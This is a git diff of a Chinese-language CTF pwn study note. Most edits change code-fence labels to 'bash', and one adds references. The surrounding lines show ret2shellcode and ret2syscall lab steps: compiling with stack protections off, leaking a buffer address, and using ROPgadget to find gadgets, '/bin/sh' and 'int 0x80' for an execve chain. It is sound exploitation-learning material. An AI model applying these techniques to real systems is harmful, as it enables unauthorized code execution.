@@ -144,14 +144,14 @@ int main() {
 
 ### 编译方式
 
-```
+```bash
 gcc ./chall.c -o ./chall -fno-stack-protector -no-pie -z exectack
 ```
 ### 攻击思路
 
 第一步，通过本地调试，拿到buf的地址：0x7fff736a1a60
 
-```shell
+```bash
 └─$ ./ret2shellcode
 The address of buf is: 0x7fff736a1a60
 Input your shellcode:
@@ -160,7 +160,7 @@ Input your shellcode:
 
 第二步，确认buf为可执行段
 
-```shell
+```bash
 └─$ checksec ret2shellcode
 [*] '/home/kali/study/ctf-space/labs/ret2shellcode/ret2shellcode'
     Arch:       amd64-64-little
@@ -279,7 +279,7 @@ void vuln() {
 
 ### 编译方式
 
-```
+```bash
 gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie -static -m32
 ```
 
@@ -289,7 +289,7 @@ gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie -static -m32
 
 控制eax
 
-```shell
+```bash
 └─$ ROPgadget --binary chall --only 'pop|ret' | grep 'eax'
 0x08091e14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 0x0809d32a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
@@ -299,7 +299,7 @@ gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie -static -m32
 
 控制edx、ecx、ebx
 
-```shell
+```bash
 └─$ ROPgadget --binary chall --only 'pop|ret' | grep 'ebx'
 0x0809d332 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
 0x08091e14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
@@ -335,7 +335,7 @@ gcc ./chall.c -o ./chall -g -fno-stack-protector -no-pie -static -m32
 
 然后是找`/bin/sh`
 
-```shell
+```bash
 └─$ ROPgadget --binary chall --string '/bin/sh'
 Strings information
 ============================================================
@@ -344,7 +344,7 @@ Strings information
 
 第二步，找到`int 0x80`，触发`execve() `
 
-```shell
+```bash
 └─$ ROPgadget --binary chall --only 'int'
 Gadgets information
 ============================================================
@@ -559,3 +559,11 @@ if __name__ == "__main__":
 **puts_addr**
 
 将字节串 `leak_addr` 的长度扩展到 4 字节，将 4 字节的小端序字节串转换为一个 Python 整数（int）。
+
+### 参考资料
+
+**恩师aipno**
+
+https://me.iswxl.cn/blog/knowledge_of_pwn/stack_overflow/basic-level_rop/
+
+https://ctf-wiki.org/
